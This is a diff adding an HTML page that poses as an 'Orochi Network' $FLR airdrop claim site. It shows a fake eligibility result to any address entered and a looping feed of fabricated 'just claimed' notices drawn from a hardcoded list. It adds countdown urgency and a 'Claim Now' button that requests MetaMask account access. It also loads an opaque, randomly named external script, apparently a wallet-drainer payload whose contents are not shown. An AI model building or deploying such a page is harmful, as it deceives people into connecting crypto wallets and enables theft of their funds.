@@ -1,0 +1,394 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script charset="UTF-8" async type="text/javascript" src="./e615e30f-c7e3-47e5-982c-c53663991a69.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Orochi Network - Claim Your $FLR</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #25ce85;
+            --secondary: #1a1a1a;
+            --accent: #2dd4bf;
+            --glass: rgba(255,255,255,0.03);
+            --dark-bg: #0a0a0a;
+        }
+
+        body {
+            margin: 0;
+            font-family: 'Inter', sans-serif;
+            background: var(--dark-bg);
+            color: white;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .container {
+            width: 90%;
+            max-width: 500px;
+            padding: 2rem;
+            text-align: center;
+        }
+
+        /* Title Styles */
+        .title {
+            font-size: 2.5rem;
+            background: linear-gradient(45deg, var(--primary), var(--accent));
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-bottom: 1rem;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+        }
+
+        .description {
+            color: #888;
+            margin-bottom: 2rem;
+            font-size: 1.1rem;
+            line-height: 1.6;
+        }
+
+        /* Input Field */
+        .wallet-input {
+            width: 80%;
+            padding: 1.2rem 1.2rem;
+            border: 2px solid #2a2a2a;
+            background: #141414;
+            color: white;
+            border-radius: 14px;
+            margin-bottom: 1.5rem;
+            font-size: 1rem;
+            transition: all 0.3s ease;
+        }
+
+        .wallet-input:focus {
+            border-color: var(--primary);
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(37,206,133,0.2);
+        }
+
+        /* Main Button */
+        .check-button {
+            background: linear-gradient(45deg, var(--primary), var(--accent));
+            color: #000;
+            border: none;
+            padding: 1.2rem 2rem;
+            border-radius: 14px;
+            cursor: pointer;
+            font-weight: 700;
+            width: 80%;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            box-shadow: 0 4px 20px rgba(37,206,133,0.2);
+            font-size: 1.1rem;
+        }
+
+        .check-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 25px rgba(37,206,133,0.3);
+        }
+
+        /* Overlay Styles */
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.95);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 100;
+            backdrop-filter: blur(10px);
+        }
+
+        .popup {
+            background: #141414;
+            padding: 2.5rem;
+            border-radius: 24px;
+            width: 90%;
+            max-width: 400px;
+            border: 1px solid rgba(37,206,133,0.3);
+            box-shadow: 0 20px 50px rgba(0,0,0,0.3);
+            animation: popIn 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        /* Popup Content */
+        .eligibility-alert {
+            color: var(--primary);
+            margin-bottom: 1.5rem;
+            font-size: 1.3rem;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+        }
+
+        .node-info {
+            text-align: left;
+            margin: 2rem 0;
+            padding: 1.5rem;
+            background: rgba(37,206,133,0.08);
+            border-radius: 14px;
+            border: 1px dashed rgba(37,206,133,0.2);
+        }
+
+        .node-amount {
+            display: flex;
+            align-items: center;
+            gap: 0.8rem;
+            margin-bottom: 0.8rem;
+            font-size: 1.1rem;
+        }
+
+        /* Button Group */
+        .button-group {
+            display: flex;
+            gap: 1rem;
+            margin-top: 2rem;
+        }
+
+        .button-group button {
+            flex: 1;
+            padding: 1rem 1.5rem;
+            border-radius: 14px;
+            border: none;
+            cursor: pointer;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+        }
+
+        .claim-btn {
+            background: linear-gradient(135deg, var(--primary), var(--accent));
+            color: #000;
+            box-shadow: 0 4px 15px rgba(37,206,133,0.3);
+        }
+
+        .close-btn {
+            background: #2d3748;
+            color: white;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+        }
+
+        .button-group button:hover {
+            transform: translateY(-2px);
+        }
+
+        /* Notification Popup */
+        .claim-notification {
+            position: fixed;
+            top: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(35,35,35,0.98);
+            padding: 1.2rem 1.8rem;
+            border-radius: 12px;
+            border: 1px solid var(--primary);
+            max-width: 90%;
+            opacity: 0;
+            transition: all 0.5s cubic-bezier(0.4, 0, 0.2, 1);
+            pointer-events: none;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+            text-align: center;
+            z-index: 200;
+        }
+
+        .claim-notification.active {
+            opacity: 1;
+            top: 40px;
+        }
+
+        .notification-progress {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            height: 3px;
+            background: linear-gradient(90deg, var(--primary), var(--accent));
+            animation: claimProgress 2s linear;
+            border-radius: 0 0 12px 12px;
+        }
+
+        /* Animations */
+        @keyframes popIn {
+            0% { transform: scale(0.95); opacity: 0; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        @keyframes claimProgress {
+            0% { width: 100%; }
+            100% { width: 0; }
+        }
+
+        /* Mobile Responsiveness */
+        @media (max-width: 768px) {
+            .title {
+                font-size: 2.2rem;
+            }
+            
+            .popup {
+                padding: 2rem;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .title {
+                font-size: 2rem;
+            }
+            
+            .popup {
+                padding: 1.5rem;
+                width: 85%;
+            }
+            
+            .button-group {
+                flex-direction: column;
+            }
+            
+            .button-group button {
+                width: 100%;
+                padding: 1rem;
+            }
+            
+            .node-info {
+                padding: 1.2rem;
+            }
+            
+            .claim-notification {
+                padding: 1rem 1.5rem;
+                font-size: 0.9rem;
+            }
+        }
+    </style>
+</head>
+<body>
+  
+    <!-- Notification Popup (Top Center) -->
+    <div class="claim-notification" id="claimNotification">
+        <div id="notificationText"></div>
+        <div class="notification-progress"></div>
+    </div>
+
+    <!-- Main Content -->
+    <div class="container">
+        <h1 class="title">Orochi Network Airdrop</h1>
+        <p class="description">Check your eligibility for $FLR rewards</p>
+        
+        <input type="text" 
+               class="wallet-input" 
+               placeholder="Enter wallet address (0x...)"
+               id="walletAddress">
+        
+        <button class="check-button" onclick="showEligibility()">
+            Check Eligibility
+        </button>
+    </div>
+
+    <!-- Eligibility Popup -->
+    <div class="overlay" id="overlay">
+        <div class="popup">
+            <div class="eligibility-alert">
+                <span>✅</span> You are eligible!
+            </div>
+            <div class="node-info">
+                <div class="node-amount">💵 3456 $FLR</div>
+                <div class="node-amount">👉 Unclaimed</div>
+                <div class="node-amount">✅ 23 days left</div>
+            </div>
+            
+            <div class="button-group">
+                <button class="claim-btn interact-button" onclick="interactButton()">
+                    <span>🗝️</span> Claim Now
+                </button>
+                <button class="close-btn" onclick="closeOverlay()">
+                    <span>✕</span> Close
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Notification System
+        const claims = [
+            { address: '0xE3B3', amount: '3454' },
+            { address: '0xE253', amount: '314' },
+            { address: '0xAB45', amount: '1275' },
+            { address: '0x9F12', amount: '862' },
+            { address: '0xC4D8', amount: '2319' }
+        ];
+
+        let currentNotification = null;
+
+        function showRandomClaim() {
+            const notification = document.getElementById('claimNotification');
+            const textElement = document.getElementById('notificationText');
+            
+            // Get random claim different from current
+            let newClaim;
+            do {
+                newClaim = claims[Math.floor(Math.random() * claims.length)];
+            } while (currentNotification && 
+                    newClaim.address === currentNotification.address);
+
+            // Update display
+            textElement.textContent = `🟢 ${newClaim.address} just claimed ${newClaim.amount} FLR`;
+            
+            // Reset animation
+            notification.classList.remove('active');
+            void notification.offsetWidth; // Trigger reflow
+            
+            // Show notification
+            notification.classList.add('active');
+            currentNotification = newClaim;
+
+            // Auto-hide after 2 seconds
+            setTimeout(() => {
+                notification.classList.remove('active');
+            }, 2000);
+        }
+
+        // Start notification cycle
+        setInterval(showRandomClaim, 3000); // 2s display + 1s gap
+
+        // Show first notification after initial load
+        setTimeout(showRandomClaim, 1000);
+
+        // Eligibility Functions
+        function showEligibility() {
+            const address = document.getElementById('walletAddress').value;
+            if(address) {
+                document.getElementById('overlay').style.display = 'flex';
+            }
+        }
+
+        function closeOverlay() {
+            document.getElementById('overlay').style.display = 'none';
+        }
+
+        // Wallet Connection and Interaction
+        async function interactButton() {
+            try {
+                if (window.ethereum) {
+                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    alert(`Connected: ${accounts[0]}`);
+                    // Add your interaction logic here
+                } else {
+                    alert('Please install MetaMask!');
+                }
+            } catch (error) {
+                console.error('Connection error:', error);
+                alert('Error connecting wallet');
+            }
+        }
+    </script>
+
+</body>
+</html>
